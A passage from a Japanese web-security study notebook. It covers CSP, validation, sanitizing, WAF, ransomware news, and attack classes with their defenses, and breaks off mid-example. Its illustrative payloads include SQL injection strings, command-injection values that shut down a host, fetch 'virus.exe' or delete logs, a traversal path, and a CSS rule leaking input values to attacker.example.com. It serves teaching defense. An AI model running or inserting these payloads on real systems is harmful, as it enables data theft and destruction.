                                    MIDDLEWARE = [
                                        '__PathTo__.CSPMiddleware',
                            request.csp_nonce で参照する場合:  #// 参照できない環境もあるようです
                                templates/____.html: |  #focus: csp_nonce  #// HTTP の body 部分
                                    <script nonce="{{ request.csp_nonce }}">
                                        // Content-Security-Policy の script-src の対象となるスクリプト
                                    </script>
                                __Middleware__.py: |  #focus: nonce  #// HTTP ヘッダー部分への追加と、テンプレートから参照できる変数の設定
                                    import base64
                                    import os
                                    from django.utils.decorators import method_decorator
                                    from django.views.decorators.csrf import csrf_protect
                                    from django.middleware.csrf import get_token

                                    class CSPMiddleware:
                                        def __init__(self, get_response):
                                            self.get_response = get_response

                                        def __call__(self, request):
                                            response = self.get_response(request)
                                            nonce = base64.b64encode(os.urandom(16)).decode('utf-8')

                                            request.csp_nonce = nonce
                                            
                                            response['Content-Security-Policy'] = (
                                                "default-src 'self'; "
                                                f"script-src 'self' 'nonce-{nonce}'; "
                                            )
                                            
                                            return response
                                settings.py:  #// CSPMiddleware オブジェクトを起動するため
                                    MIDDLEWARE = [
                                        '__PathTo__.CSPMiddleware',
                        #search: HTTP header
                    #ref: https://mui.com/material-ui/guides/content-security-policy/
                ハッシュを使う場合: #keyword: hash CSP  #// JavaScript のコードのハッシュ値
                    HTTP ヘッダー: |  #focus: __Hash__, __Script__
                        Content-Security-Policy: script-src 'self' 'sha256-__Hash__';
                    HTML:
                        <script>__Script__</script>
                    注意:
                        -   ハッシュを作る サーバー のコードが、ユーザーが実行する JavaScript を（コピーでも）参照できる必要があるので
                            nonce より難しそうです
                        -   コードが変わればハッシュ値も変わります。style-src では CSS のハッシュ値になります。
                            なので、nginx などの汎用 Web サーバー には Content-Security-Policy を設定できません。
                        -   サーバー側でハッシュを作るときは、DB から取得したデータを含まないかサニタイズした
                            スクリプトや CSS から作ってください。
                    解説:
                        動的に変わるコードだけハッシュを作り、他のコードはサーバーから静的にロードします。
                        ユーザーによって編集したコードは実行できません。ブラウザーが実行停止します。
                    実装コード:
                        Node.js の場合:  #focus: hash
                            const crypto = require('crypto');
                            const script = "window.USER_ID = '121';";
                            const hash = crypto.createHash('sha256').update(script).digest('base64');

                            res.setHeader('Content-Security-Policy', `script-src 'sha256-${hash}';`);
                            const scriptTag = `<script>${script}</script>`;
                        #search: HTTP header
            unsafe-inline を使う場合: #keyword: unsafe-inline CSP  #// セキュリティ効果が大幅に低下します
                注意:
                    -   セキュリティ効果が大幅に低下します。
                    -   nonce（ナンス）を使うことを推奨します。  #search: nonce CSP
                    -   style-src に unsafe-inline を設定すると、HTML タグにインラインで埋め込む CSS を許可します。
                設定: |  #focus: unsafe-inline
                    Content-Security-Policy: default-src 'self';  script-src 'self' 'unsafe-inline';  style-src 'self' 'unsafe-inline';
                実装コード:
                    nginx.conf の場合: |  #search: nginx add_header
                        server {
                            add_header Content-Security-Policy "default-src 'self';  style-src 'self' 'unsafe-inline';  script-src 'self' 'unsafe-inline';";
            unsafe-eval を使う場合: #keyword: unsafe-eval CSP  #// セキュリティ効果が大幅に低下します
                注意: eval の呼び出し（またはそに相当する呼び出し）を許可します
                設定: |  #focus: unsafe-eval
                    Content-Security-Policy: default-src 'self';  script-src 'self' 'unsafe-eval';
            悪意のあるブラウザー:
                悪意のあるブラウザー:
                    ハッシュや nonce をチェックしない特殊なブラウザー（違法）や、
                    静的にロードしたスクリプトを変更するブラウザーを悪意のある人が使うと、
                    Content-Security-Policy は効果がありません。
                    CSRF に対応していなければ、本人以外の情報に関して、任意のスクリプトが使えます。
                正規のブラウザー:
                    正規のブラウザーを使うユーザーは一部の攻撃から守ることができます。
                    インライン スクリプト をブロックすることで XSS 攻撃のスクリプトの実行などを防ぐことができます。
                    掲示板に インライン スクリプト に埋め込む攻撃では、HTTP ヘッダー（に含まれる設定やハッシュ）を作り直すことはできません。
                    #ref: ${typrm_files}/ref/Network-AI.yaml#label: malicious browser
            設定サンプル: |
                    default-src 'self'; script-src 'self' 'https://trusted.cdn.com'; style-src 'self' 'https://trusted.cdn.com';
                #// すべてのコンテンツをサイト独自のオリジン(サブドメインを除く)から取得することを望んでいます
                #ref: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#example_1
            CORS との違い: |
                |           CSP              |        CORS            |
                | -------------------------- | ---------------------- |
                | クライアント側で制御します | サーバー側で制御します |
        X-XSS-Protection: #keyword:  #ref: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/X-XSS-Protection
            使わないでください
        バリデーション: #keyword: バリデーション,  入力値のチェック
            効果:
                概要: DoS 攻撃, オーバーフロー, リソース枯渇
                参考:
                    blog:
                        「入力バリデーションは直接的なセキュリティ対策ではないことが多いからセキュリティ対策ではない」
                        と主張することも可能かもしれません。入力バリデーションはセキュリティ問題に対する直接的な対策である場合もあれば、
                        そうでない場合もあります。
                        オーバーフローやリソース枯渇によるDoSなどを除けば、入力バリデーションは直接的なセキュリティ対策とは言いがたい場合もあります。
                        #ref: https://gihyo.jp/dev/serial/01/php-security/0045 >>  直接的なセキュリティ対策
                    ESI:
                        セキュアコーディング／プログラミングで最も重要な原則は『入力データバリデーション』
                        #ref: https://www.es-i.jp/services/secure-coding-evaluation
            クライアント側:
                HTTP GET メソッド:
                    特に対策しなくても、パラメーターが長すぎると 414 Request-URI Too Long になります。
                HTML5: #keyword: Client-side form validation
                    #ref: https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation#using_built-in_form_validation
                    #ref: https://atmarkit.itmedia.co.jp/ait/articles/1104/25/news137.html
                    required属性による入力必須制約
                    pattern属性による入力値のパターン制約
                    type属性に応じた入力値のタイプ制約
                    step属性による入力値制約
                    min属性、max属性による入力値の範囲制約
                    maxlength属性による入力値の長さ制約
                HTML4 以前:
                    ブラウザーで JavaScript を無効にされるとチェックできない
                Material-UI:  #search: Material-UI varidation
                クライアント側入力チェックは安全でない:  #ref: https://www.ipa.go.jp/security/awareness/vendor/programmingv1/pdf/a01_01.pdf
            サーバー側:
                チェック方法の参考:  #search: Client-side form validation
                DB の CHECK制約: #keyword:
                    MySQL 8.0.16:  #ref: https://www.ritolab.com/posts/197
                        CREATE TABLE tbl (
                            number INT CHECK (0 < number AND number <= 5),
                            word VARCHAR(20) CHECK (word REGEXP '^[a-z]+$')
                        );
                    SQLAlchemy: | #focus: @validates  #ref: https://qiita.com/GuriTech/items/78fdc4018f785969c254
                        from sqlalchemy.orm import declarative_base
                        from sqlalchemy.orm import validates
                        from sqlalchemy.schema import Column
                        from sqlalchemy.types import VARCHAR

                        class User(Base):
                            __tablename__ = "user"
                            user_id = Column(VARCHAR(26), name="id", primary_key=True)
                            name = Column(VARCHAR(255), name="name", nullable=False)
                            email = Column(VARCHAR(255), name="email")

                            @validates("email")
                            def validate_email(self, key, value):
                                if "@" not in value:
                                    raise ValueError("Invalid email address")
                                return value # valueを返す必要があります。

                            @validates("name", "user_id") # 複数のフィールドを指定できます。
                            def validate_name(self, key, value):
                                if value is None:
                                    raise ValueError("Value must not be None")
                                return value

                        user = User(user_id="1", name=None, email="john.example.com")
            文字列の最大長, 数値の範囲:
            パターン マッチング:
                正規表現にマッチしたもののみ受け入れる。ただし、正規のパターンでも SQL インジェクションなどに悪用される可能性はあります
                #search: SQL インジェクション
                #search: OS command injection
                #search: サニタイジング
        サニタイジング, サニタイズ: #keyword:サニタイジング, サニタイズ   #// スクリプトの無効化
            #// 通常、出力時に行います。
            エスケープとの違い:
                エスケープ: 小なり記号等を文字実体参照に変換すること
                サニタイズ: HTML から JavaScript 実行の可能性のある要素や属性を取り除くこと
            React 等:
                自動的に行われます
            JavaScript: |  #ref: https://cybersecurity-jp.com/security-measures/33684
                output = htmlentities( message );

                function  htmlentities(str) {
                    return String(str)
                        .replace(/&/g, "&amp;")
                        .replace(/"/g, "&quot;")
                        .replace(/</g, "&lt;")
                        .replace(/>/g, "&gt;");
                }
            PHP: htmlspecialchars
        ゼロ トラスト: #keyword:
            Zero Trust Architecture, NIST SP800-207: #keyword:
        WAAP:  #// Web Application and API Protection。WAF + APIセキュリティ + Bot対策 + DDoS対策  #ref: https://www.f5.com/ja_jp/cloud/use-cases/web-application-and-api-protection-waap
        WAF: #keyword:  #// Web Application Firewall  #ref: https://www.ipa.go.jp/files/000017316.pdf#page=60
            #// ウェブ アプリケーション の改修が困難なときに有効。偽陽性と偽陰性になる場合があります
            目的: WAF は通信内容のパターンマッチングで攻撃を検出するので WAF だけでは完全に防ぐことができない。
                脆弱性の根本対応のために改修が必要。改修が完了するまでの時間稼ぎと考えるべき
            対象攻撃:
                XSS 対処: 公式を経由する WAF がフォームの入力内容をチェックする
            WAF の設定ミスによる セキュリティ ホール:  #ref: https://x.com/ockeghem/status/1729275373291237666
                なぜ攻撃を受けたか:
                    - S3ストレージに大量の個人情報を保存
                    - S3ストレージのアクセス権がWAFのインスタンスに付与されていた
                    - WAFがオープンPROXYになっていた
                    - IMDSが無効化されていなかった
        ウイルス対策ソフト: #keyword: ウイルス対策ソフト  #// ウィルスではない
            MDE, Microsoft Defender for Endpoint: #keyword:
                バージョンを確認します:
                    (PowerShell) Get-MpComputerStatus | Select-Object AMProductVersion
        公衆無線 LAN:
            対処:
                ユーザー: HTTPS 通信を使う
                開発者: Cookie に secure 属性を付ける。常時 SSL 接続でも必要です
            脆弱性:
                HTTP 通信など:
                    WPA2 で暗号化してもパスワードを共有するので解読されます
                HTTP の 443 ポート:
                    （HTTPS の 443 ポートでアクセスしたページ(A)のリンクに書かれた URL(A) が、）
                    HTTPS の 443 ポートではなく HTTP の 443 ポートにアクセスする URL(B) だった場合、
                    その URL にアクセスすると secure 属性が付いていない cookie が漏洩します。
                    URL(A) { URL(B) }
                    URL(B) = http://example.com:443/
            参考:
                常時SSLでもCookieのSecure属性が必要な理由:
                    #ref: https://www.youtube.com/watch?v=yXNOJE9kGK8
    攻撃: #keyword: network attack  #// ネットワークを使った悪意のある操作
        ソーシャルエンジニアリング攻撃: #keyword:
        ランサムウェア攻撃: #keyword:  #// 復号するために身代金を要求します
            概要: ランサム（Ransom）は、一般的には身代金という意味。システムに侵入し、大事なデータを暗号化し、復号するために身代金を要求します
            ニコニコ, KADOKAWA (2024-08-11 時点の情報):
                概要:
                    2024 年 6月 8日から、ニコニコ動画や KADOKAWA のネットサービスが停止。
                    Black Suit を名乗るハッカー集団によるランサムウェアを含む大規模かつ執拗なサイバー攻撃。
                オリコン 2024-06-14:  #ref: https://www.oricon.co.jp/news/2331745/full/
                    2024-06-14 ドワンゴは、8日より続いているニコニコ生放送などのサービス障害について、
                    現在の状況を伝えた。
                    システム概要図、パブリック クラウド（aws）、プライベート クラウド
                    サービス再開までの行程、クリーンな環境の構築、データの確認と復旧計画、再構築、テスト
                    無事だったデータ
                公式まとめ:  #ref: https://blog.nicovideo.jp/niconews/225099.html
                    #// 最初は最も下の「6/8 掲載」、以降は上方向に追記しています
                    8/5追記: 8月5日（月）15時より、新バージョン「帰ってきたニコニコ」として、「ニコニコ」サービスを再開いたしました。
                    8/1追記:
                    7/26追記: サービス停止にともなう2024年6月・7月・8月のご利用料金の補償につきまして、詳細が確定しました
                    6/19 追記:
                    6/14 追記:  #// ドワンゴプレスリリース ： ６月１４日（金）１５時配信
                        自社サーバーにクレジットカード情報を保存しておりません
                    6/10 追記:
                    6/8 掲載: サービスを一時的に停止しています
                25万人分の個人情報流出: #ref: https://www.itmedia.co.jp/news/articles/2408/05/news146.html
                再開のお知らせ 公式twitter 8/6:  #ref: https://x.com/nico_nico_info/status/1820694292169740600
                Black Suit の犯行声明を news picks が報道:  #ref: https://newspicks.com/news/10160526/body/
                    翻訳全文:  #// 第3者による翻訳（暴露） #ref: https://note.com/taniryuya/n/n5b846287c17b
                    夏野氏の抗議コメント:
                        このような記事をこのタイミングで出すことは、犯罪者を利するような、
                        かつ今後の社会全体へのサイバー攻撃を助長させかねない行為です。
                        Newspicksに強く抗議をするとともに、損害賠償を含めた法的措置の検討を進めてまいります。
                        なお、本記事についてコメントすることはございません。
                    産経新聞 2024:06-27:  #ref: https://www.sankei.com/article/20240627-HEQJPDCVLNKITH6QH7UYCJRBUQ/
                        犯人の名前のみ。詳細は記事にしていない
                アベプラ 2024-06-26 動画:  #ref: https://youtu.be/J-Lhw84p1cc?si=0anU3ziLgUrfSRRM
                    犯人を利する報道:
                        復旧にあたる人達が作業に集中できなくなる。払うべきか論争など
                        デマの可能性、対応に追われる
                        報道機関が犯人に接触すると警察が怒る
                アベプラ 2024-06-15 動画:  #ref: https://youtu.be/Xt5TbqFGYmU?si=k8-1AKxub9OJZhiC
                    #// 執拗なサイバー攻撃って？ランサムウェアで身代金要求？復旧メドは？ひろゆき&SB辻伸弘と考える
                    概要:
                        攻撃: ランサムウェアを含む大規模かつ執拗なサイバー攻撃
                        被害対象: ニコニコ動画やKADOKAWAグループのサーバー
                    予想される攻撃:
                        攻撃前: 内通者、または攻撃者が侵入してシステムの状況を把握
                    対応状況:
                        #↓被害の大きさ
                        小: サービスを継続しながら対策
                        中: VM の電源断
                        大:
                            遠隔操作による仮想環境の電源断、攻撃者によって電源再投入される
                            土台から電源断する、通信ケーブルを抜く
                        諦め:
                            まっさらなサーバーから作り直す
                            ただし、原因究明ができなくなる
                        内通者対応:
                            リモートワークにすることで内通者の能力を少しでも削る
                    払うべきか:  #// 身代金を払うべきかどうか
                        - 払うとまたつけ込まれる。それは一般常識ではあるがそんな単純な話ではない
                        - 大手の攻撃者ほど信用のためにきちんとするので、払ったらきちんと開放する（復号化する）
                        - 開放はすぐに完了する（復号化するだけなので）
                        - 攻撃者はビジネスなので、自力で回復するよりもコストを安く請求される。
                            情報や金銭の被害を最小限にすることだ第一
                        - 支払いしつつ、自力でも復旧していく
                        - こっそりと犯人に屈してお金を払い、素早く復旧したときは、被害報告報告されないこともある
                    ユーザーの動き:
                        - ユーザーの活動を止まってしまう
                        - もしくは、他のプラットフォームに移ってしまう
                アベプラ 2024-07-10 動画:  #ref: https://youtu.be/IKxEdF40NFA?si=nfYBBJwySV4r8WfD
                    #// ハッカー集団が身代金交渉に利用“ダークウェブ”の実態
                    ダーク ウェブ:
                        - 脅迫状（ランサム ノート）に ダーク ウェブ のチャットルームへのリンクがあり、そこで交渉が行われる。足が付きにくい。
                    払うべきか:
                        - 9割減もある。ビジネスだと言う。ゼロにはしたくない
                        - 攻撃相手の人件費を犯人が知っていて、身代金の額を決められる
                        - ただし、消してもらうことへの支払いは無駄
                        - プレスリリースにある情報漏洩の件数は、犯人が漏洩させたものを見て決まることがある
                    犯人像:
                        ロシア系グループ: 旧ソ連圏には攻撃しないルールのランサムグループが多いから
                    脅迫されたとき:
                        一般企業:
                            ランサム攻撃の対策に強い人を連れてくる
                            警察は払うなと言うだけだが、相談だけするケースも多い。
                            警察に被害届を出さないと保険が降りない
                            情報を盗んたことと、暗号化したこと、など多重に脅迫されるが、
                        病院など:
                            厚生労働省へ連絡すると専門家を手配されるようになった
                上念司チャンネル 動画:  #ref: https://youtu.be/wntLZbnZfYo?si=74qP4mDjtrTpFV0L
                    #// 元内閣衛星情報センター次長、茂田忠良氏に訊く
                    別件、ロックビット（犯人）に日本の警察庁のサイバー局、修復ソフト
                    日本の企業はアメリカと違って保険が無いから（財務省の方針で）意外と対策している
                    払ったビットコインを取り替えす。シギント機関
                カスペルスキー:
                    ニコニコを攻撃したのはロシアのハッカー集団。
                    EU との合意で、Windows は、カーネルレベルへのアクセス権をセキュリティソフトの開発者に
                    与えなければならないので、ロシア産のセキュリティソフトであるカスペルスキーは
                    カーネルレベルのアクセス権を持っている。悪用される可能性がある。
            AI によるランサムウェアとは:  #// 記入者による加筆あり
                感染経路:
                    フィッシングメールの悪意のあるリンク
                    不正なウェブサイト
                    ソフトウェアの脆弱性の悪用
                攻撃の仕組み:
                    マルウェアを使ってコンピューターやネットワークに侵入します。
                    重要なファイルやシステムを暗号化して使用不能にします。
                身代金要求:
                    攻撃者は、ファイルの復号と引き換えに身代金を要求します。
                    もしくは漏洩されたくなかったら払えと脅します。
                    多くの場合、仮想通貨での支払いを求めます。
                    支払いをしても必ずしもファイルが復元されるわけではなく、逆に追加の金銭を要求されることもあります。
                影響:
                    データの喪失、漏洩
                        ユーザーの個人情報、取引先との契約書
                    業務の中断
                    金銭的損失
                    評判の低下
                主な標的:
                    企業、政府機関、医療機関、教育機関など、重要なデータを持つ組織が狙われやすいです。
                    弁護士事務所など個人ユーザーも標的になることがあります。
                事前対策:
                    定期的なバックアップ
                    バックアップの保護
                    ソフトウェアの更新
                    セキュリティ意識の向上（ひっかからない）
                    多層防御戦略の導入
        DDoS, Dos: #keyword;  #// 負荷を高めてサービスをダウンさせる。復旧は早い
        XSS, クロスサイト スクリプティング: #keyword: XSS,  クロスサイト スクリプティング
            保護対象: HTML のフォーム
            攻撃内容:
                概要: 攻撃者が公式サイトに悪意のあるスクリプトを間接的に埋め込む。
                    公式サイトの訪問者に悪意のあるサイトを表示させ、訪問者の個人情報を盗む
                埋め込み方の例:
                コメント欄にスクリプトを埋め込む:
                    1. 攻撃者は、入力フォームにスクリプト付のリンクを含む内容を入力してWebアプリケーションに罠を仕掛ける（例：掲示板サイト）
                    2. 訪問者が該当のWebアプリケーションを利用
                    3. リンクをクリックしてスクリプトが実行されると、別のWebサイトに遷移（クロスする）して悪意のある内容（スクリプト）が実行される
                    #ref: https://www.shadan-kun.com/waf/xss/
                対象範囲:  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_5.html
                    この脆弱性が生じやすいページの機能例: |
                        ・ 悪意のある人が入力した内容を他の人が見ることができるページ
                        ・ ログイン画面
                        ・ 個人情報の入力画面
                        ・ 入力内容を確認させる表示画面（会員登録、アンケート等）
                        ・ 誤入力時の再入力を要求する画面で、前の入力内容を表示するとき
                        ・ 検索結果の表示
                        ・ エラー表示
                        ・ コメントの反映（ブログ、掲示板等） 等
            根本的解決:
                サニタイジング:  #search: サニタイジング
                #search: WAF
                IPA: #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_5.html
                    エスケープ処理:  #keyword: HTML security escape  #search: 実体参照
                        - <, >, & を HTML エンティティ &lt; , &gt;, &amp; に置換してレスポンスします
                        - 通常、ライブラリが行っています
                    HTTPレスポンスヘッダのContent-Typeフィールド: |
                        charset を付けます。
                        Content-Type: text/html; charset=UTF-8
                    ブラウザの機能:  #// 潜在的な脆弱性対策として有効なブラウザの機能を有効にするレスポンスヘッダを返す
                        X-XSS-Protection:
                        Content Security Policy:
                            reflected-xss block:
                React:
                    - エスケープあり(OK)  #ref: https://zenn.dev/yuuhu04/books/xss-anti-pattern-of-react-and-vue/viewer/xss-over-react
                    - dangerouslySetInnerHTML はエスケープなし
                Django:
                    テンプレート: エスケープあり(OK)  #ref: https://orangain.hatenablog.com/entry/20080822/1219310039
        CSRF, XSRF: #keyword: CSRF, XSRF, クロスサイト リクエスト フォージェリ
            保護対象: フロントエンドとバックエンドの接続部分
            攻撃内容:
                なりすましの防止。
                攻撃者が被害者（情報漏洩させられる人）に偽物のサイトを見せて、WebAPI で入手できる情報を盗むことや、意図しない書き込みをさせること。
                #ref: ${typrm_files}/ref/Network-AI.yaml#label: CSRF target
            根本的対策:
                #search: CSRF トークン
                #search: CORS
        SQL インジェクション: #keyword: SQL injection
            保護対象: SQL 呼び出し。プログラミング言語部分。 DBの設定（#search:backslash SQL injection, Shift JIS SQL injection）
            攻撃内容:
                概要: SQL のパラメーターになる「Web フォームの項目」に SQL の式を入力し、情報漏洩などを起こさせます
                しくみ:
                    開発者）サーバーの内部で実行する正常な SQL 文:
                        SELECT * FROM user WHERE id='__UserID__'
                    攻撃者）漏洩させるためのパラメーター:
                        __UserID__: __UserID__' or 'A'='A
                    その結果実行される危険な SQL 文:
                        SELECT * FROM user WHERE id='__UserID__' or 'A'='A'
                        #// 'A'='A' は常に真なので、指定した id 以外のすべての id に関する情報が漏洩します
                被害:
                    情報漏洩, データの改ざん, システム停止, OSコマンドの実行など
                    #ref: https://www.ipa.go.jp/files/000017316.pdf#page=8
            根本的対策:
                #↓プレースホルダー
                プレースホルダーにバインド:
                    SQL 文の文字列で値を埋め込まず、エスケープも行うので or 'A'='A' を指定できません。
                静的プレースホルダー:  #// 推奨  #keyword: SQL static placeholder  #ref: https://www.ipa.go.jp/files/000017320.pdf#page=12
                    概要: プレースホルダーを データベース エンジン が解析します。
                        プレースホルダーのままの SQL 文をデータベースエンジン側にあらかじめ送信して、実行前に、SQL 文の構文解析などの準備をします。
                        パラメーターの値だけで SQL 文の構造を変えることはできません。
                動的プレースホルダー:  #keyword: SQL dynamic placeholder
                    概要: プレースホルダーをライブラリが解析します。
                        クライアント サイド の prepared statement。 JIS の Prepared Statement ではありません。
                #↓プログラミング言語
                Java:
                    prepareStatement:
                        #ref: https://docs.oracle.com/javase/jp/8/docs/api/java/sql/PreparedStatement.html
                        Oracle:
                            #ref: https://www.ipa.go.jp/files/000017320.pdf#page=18
                        MySQL:
                            #ref: https://www.ipa.go.jp/files/000017320.pdf#page=27
                            #search: MySQL SQL injection
                PHP:
                    prepare:
                        #ref: https://www.ipa.go.jp/files/000017320.pdf#page=20
                    pg_prepare:
                        #ref: https://www.ipa.go.jp/files/000017316.pdf#page=74
                Perl:
                    DBI:
                        #ref: https://www.ipa.go.jp/files/000017320.pdf#page=23
                Python:
                    SQLAlchemy:
                #↓データベース
                ASP.NET:
                    Microsoft SQL Server:
                        #ref: https://www.ipa.go.jp/files/000017320.pdf#page=29
                MySQL:
                    NO_BACKSLASH_ESCAPES: #keyword:
                        #search: backslash SQL injection
                    Java: #search: Java SQL injection
                PostgreSQL:
                    standard_conforming_strings: #keyword:
                        #search: backslash SQL injection
                #↓プログラミング
                バックスラッシュによる SQL インジェクションの対策: #keyword: backslash SQL injection
                    しくみ:
                        開発者）サーバーの内部で実行する正常な SQL 文:
                            SELECT * FROM user WHERE id='__UserID__'
                        攻撃者）漏洩させるためのパラメーター:
                            __UserID__: \' or 'A'='A
                        エスケープ処理をした後の:パラメーター:  #search: SQL dynamic placeholder
                            __UserID__: \'' or 'A'='A
                        その結果実行される危険な SQL 文:
                            SELECT * FROM user WHERE id='\'' or 'A'='A'
                            #// 'A'='A' は常に真なので、指定した id 以外のすべての id に関する情報が漏洩します
                    MySQL:  #search: NO_BACKSLASH_ESCAPES:
                    PostgreSQL:  #search: standard_conforming_strings
                Shift JIS による SQL インジェクションの対策: #keyword: Shift JIS SQL injection
                    backslash SQL injection と同じ。「表」の 2バイト目はバックスラッシュであるため。
                    Unicode から Shift JIS に変換して発生する可能性もある。
                    Shift JIS を使わない。
                    #ref: https://www.ipa.go.jp/files/000017320.pdf#page=34
            保険的対策:
                エラーメッセージによるヒントの非表示:
                最小権限:
                    ウェブアプリケーションからデータベースに渡す命令文を洗い出し、その命令文の実行に必要な最小限の権限をデータベースアカウントに与えてください。
            参考:
                安全な SQL の呼び出し方: #keyword:  #search: SQL injection
                    #ref: https://www.ipa.go.jp/files/000017320.pdf
                    #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_1.html
        OS コマンド インジェクション: #keyword: OS command injection, コマンド注入
            保護対象: OS コマンド呼び出し。プログラミング言語部分
            攻撃内容:
                任意の OS コマンドの実行:
                    #// 以下はサンプルです
                    2つ目に実行するコマンド:  #// OS コマンド のパラメーターになる「Web フォームの項目」に、2つ目に実行するコマンドを書く
                        dummy parameter  &&  shutdown
                        dymmy parameter  &&  curl  virus.exe
                    システム内部のファイルを指す値:  #// OS コマンド のパラメーターになる「Web フォームの項目」に、システム内部のファイルを指す値を設定する
                        #search: directory traversal
                OS コマンド実行関数: #keyword: OS command functions
                    Go: exec.Command, exec.CommandContext
                    Python: os.system(), os.popen(), subprocess.call, subprocess.check_call
                    Ruby: exec(), system(), `...`, open("|{command}", mode, perm), open("|-{command}", mode, perm)
                    Perl: exec(), system(), `...`, qx/.../, open(h, "|{command}"), open(h, "{command}|")
                    PHP: exec(), passthru(), proc_open(), shell_exec(), system()
                    #ref: https://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/501.html
            根本的対策:
                OS コマンド実行関数を使わない:
                    #search: OS command functions
            保険的対策:
                ホワイトリスト方式の引数チェック:
                    IPA による説明:  #ref: https://www.ipa.go.jp/files/000044465.pdf  >> ブラックリスト方式
                        使える文字の制限など。
                        ブラックリスト方式（;, |, >, < などの検出）は漏れがある
                    概要: コマンドが固定値であり、かつ、パラメーターはユーザーが指定できないものなら対策済みとする
                    コマンドが固定値:
                        リテラルでコマンドを指定しているもの。
                        subprocess.call('git', ____)
                    パラメーターはユーザーが指定できない:
                        下記 'log' は、システム仕様で定義したフォルダー名である（ホワイトリストにある）ため問題なし。
                        subprocess.call('cp', path, 'log')
            その他の対策:
                cp, mv, rm など:  #// ファイル操作のコマンドの場合
                    フルパスや親フォルダー(..)を指定できないようにする。システムが破壊されないようにするため
                (>), (<) が機能する OS コマンド実行関数の場合: #// リダイレクト
                ;, | などが機能する OS コマンド実行関数の場合: #// コマンドの区切り
                    危険な文字: ;, |, &&, ||
                    サンプル:
                        メールアドレス: |
                            xxx@example.com; rm -rf /var/log/xxx.log  #
                        実行されるコマンド: |
                            mail -s “タイトル” xxx@example.com; rm -rf /var/log/xxx.log  # < /var/data/aaa.txt
                        実行内容:
                            メールを送って、ログを削除（形跡を隠滅）
                        #ref: https://www.shadan-kun.com/blog/measure/2873/ >>  削除のプログラム例
                mail:  #// メールを送信するコマンドの場合
                    外部にメール送信できない環境の場合: 漏洩の心配はない
        ディレクトリ トラバーサル: #keyword: directory traversal  #ref: https://gigazine.net/news/20220922-python-old-bug-unpatched-15-years/
            保護対象: URL
            攻撃内容:
                概要: 「URL の一部」に、システム内部のファイルを指す値を設定する
                開発者）クエリーパラメーターを受けとる URL:
                    https://example.com/file?path=__Path__
                攻撃者）ユーザー非公開のファイルへのパス:
                    __Path__: ../otherUser/secret.txt
            根本的対策:
                パスのクエリーパラメーターは禁止:
                    ID のクエリーパラメーターに変更し、かつ、ホワイトリスト方式にする
        セッション ハイジャック: #keyword: session hijacking
            保護対象: セッションID
            攻撃内容:
                推測: シンプルな ID から、他人の ID を推測する
                盗用:
                    セッションID の固定化:  #keyword: session fixation
                        攻撃者の セッションID を被害者に送りパスワードを盗む
            根本的対策:
                マネージド サービス:
                暗号論的擬似乱数生成器:
                HTTPS通信で利用するCookieにはsecure属性を加える:
                    secure属性: #keyword: Cookie secure 属性
                        secure 属性が付いている Cookie は、HTTP 接続の通信では送信されなくなり、漏洩しなくなります。
                    secure 属性があることを確認します: #keyword: Cookie secure 属性 確認方法
                        Edge: 開発者ツール >> Network タブ >>（リロード）>> Name（列のどれか）>> Cookies タブ（右）>> Secure（列）>> チェックがあれば secure 属性あり
                        Chrome: 開発者ツール >> アプリケーション タブ >>（ストレージ）Cookie（左）>> Secure（列）
                    React:
                        ブラウザー:
                            コード: document.cookie
                        react-cookie:
                            import { CookiesProvider } from "react-cookie";
                    参考:
                        常時SSLでもCookieのSecure属性が必要な理由:
                            #ref: https://www.youtube.com/watch?v=yXNOJE9kGK8
                #// など多数
                セッションID の指定場所:
                    secure 属性の Cookie または、POST メソッドの hidden パラメーターに入れること。
                    ユーザーが Cookie を拒否したときの動作確認
            保険的対策:
                セッションID の有効期限:
        HTTP ヘッダー インジェクション: #keyword: HTTP header injection  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_7.html
            保護対象: HTTP ヘッダー
            攻撃内容:
                概要: HTTP ヘッダー の値になる「Web フォームの項目など」に、改行と悪意のある HTTP ヘッダーを入れます
                開発者）通常の HTTP ヘッダー:
                    "__Name__": "__Value__"
                攻撃者）__Value__: |  #// 改行によって任意の項目を追加できる
                    __Value__"\n"__BadName__": "__BadValue__
                その結果送信される危険な HTTP ヘッダー:
                    "__Name__": "__Value__"
                    "__BadName__": "__BadValue__"
            根本的対策:
                ヘッダー出力用 API:
        メール ヘッダー インジェクション: #keyword: mail header injection
            保護対象: 電子メールのヘッダー
            攻撃内容:
                しくみ:
                    攻撃者）タイトル: |  #// 改行によって任意の項目を追加できる
                        __Subject__\n__BadName__: __BadValue__
                        #// Bcc で漏洩できる
            根本的対策:
                マネージド サービス:
        CPDoS, キャッシュ汚染, DNSキャッシュポイズニング:
            攻撃内容: 偽のDNS情報をキャッシュとして蓄積させる「DNSキャッシュポイズニング」
            #ref: https://www.nic.ad.jp/ja/newsletter/No40/0800.html
        クリック ジャッキング: #keyword: click jacking  #ref: https://ja.wikipedia.org/wiki/クリックジャッキング
            保護対象: HTML のフレーム（クリック）
            攻撃内容: 正規のページの上に透明なレイヤーを置き、クリックを横取りする攻撃
            X-Frame-Options:  #ref: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/X-Frame-Options
                #// この機能は非推奨になりました。推奨→ #search: Content-Security-Policy frame-ancestors
                設定対象:
                    Apache:
                    nginx: add_header X-Frame-Options SAMEORIGIN always;
                値: DENY | SAMEORIGIN | 指定なし
            SVG クリック ジャッキング:
                iframe をただ重ねるだけでなく、表示内容のスタイルを変えたりもできる。
                たとえば、シークレットを表示する部分を、CAPTCHA フォームに偽装することで、ユーザー入力からシークレットを漏洩させてしまう。
                Google の脆弱性も併せて公開され対策された。
                #ref: ${typrm_files}/ref/Network/SVG_click_jacking.md
        スペルジャッキング:  #ref: https://gigazine.net/news/20220920-chrome-edge-expose-pii/
        バッファオーバーフロー:  #search: buffer overflow
        CSS インジェクション: #keyword:  #// たとえば、攻撃者のサーバー attacker.example.com に HTTP リクエストを出すことで情報漏洩します
            HTML: |
                外部サイトから CSS をロード
                <input type="hidden" value="abc">
            CSS: |  #// 悪意のある人が外部サイトに設定した CSS
                input[value ^= "a"] {
                    background: url(http://attacker.example.com/?a)
                }
                input[value ^= "b"] {
